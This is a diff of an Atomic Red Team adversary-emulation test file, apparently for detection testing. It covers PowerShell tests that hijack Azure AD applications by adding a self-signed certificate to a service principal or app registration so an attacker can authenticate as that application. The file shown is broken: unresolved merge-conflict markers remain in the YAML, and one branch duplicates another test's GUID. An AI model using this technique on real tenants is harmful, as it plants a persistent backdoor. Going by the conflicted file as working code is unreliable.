@@ -3,10 +3,9 @@ display_name: Additional Cloud Credentials
 atomic_tests:
 - name: Azure AD Application Hijacking - Service Principal
   auto_generated_guid: b8e747c3-bdf7-4d71-bce2-f1df2a057406
-  display_name: 'Azure AD Service Principal Hijacking'
   description: |
-    Add a certificate to an Application through its Service Principal. Certificate will be link to the appdId.
-    The certificate can be used to authenticate as the application and benefits from its access.
+    Add a certificate to an Application through its Service Principal.
+    The certificate can then be used to authenticate as the application and benefit from its rights.
     An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
   supported_platforms:
   - windows
@@ -38,7 +37,13 @@ atomic_tests:
       Connect-AzureAD -Credential $Credential
 
       $sp = Get-AzureADServicePrincipal -Searchstring $App_name
+<<<<<<< HEAD
       $notAfter = (Get-Date).AddMonths(6) 
+=======
+      $pwd = "#{CertificatePassword}"
+      # in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
+      $notAfter = (Get-Date).AddDays(1) 
+>>>>>>> 0428f97a841e06b0dd99e64da6593e2ca12e1cbe
       $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -CertStoreLocation "cert:\LocalMachine\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $notAfter).Thumbprint
       $pwd = ConvertTo-SecureString -String #{CertificatePassword} -Force -AsPlainText
       Export-PfxCertificate -cert "cert:\localmachine\my\$thumb" -FilePath #{PathToCert}'\'#{application}'.pfx' -Password $pwd
@@ -59,11 +64,15 @@ atomic_tests:
     elevation_required: false
 
 - name: Azure AD Application Hijacking - App Registration
+<<<<<<< HEAD
   auto_generated_guid: a12b5531-acab-4618-a470-0dafb294a87a
   display_name: 'Azure AD App Registration Hijacking'
+=======
+  auto_generated_guid: b8e747c3-bdf7-4d71-bce2-f1df2a057406
+>>>>>>> 0428f97a841e06b0dd99e64da6593e2ca12e1cbe
   description: |
-    Add a certificate to an Application through its App Registration. Certificate will be link to the appdId.
-    The certificate can be use to authenticate as the application and benefits from its access.
+    Add a certificate to an Application through its App Registration.
+    The certificate can then be used to authenticate as the application and benefit from its rights.
     An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
   supported_platforms:
   - windows
